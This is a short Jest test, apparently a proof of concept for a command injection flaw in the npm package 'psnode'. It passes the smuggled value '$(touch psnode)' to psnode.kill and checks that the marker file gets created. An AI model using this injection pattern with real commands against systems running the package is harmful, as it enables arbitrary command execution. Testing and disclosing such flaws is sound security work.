test("Command Injection in psnode", (done) => {
  expect.assertions(2);
  const psnode = require("psnode");
  const fs = require("fs");
  const path = "./psnode";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  psnode.kill("$(touch psnode)", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  });
});
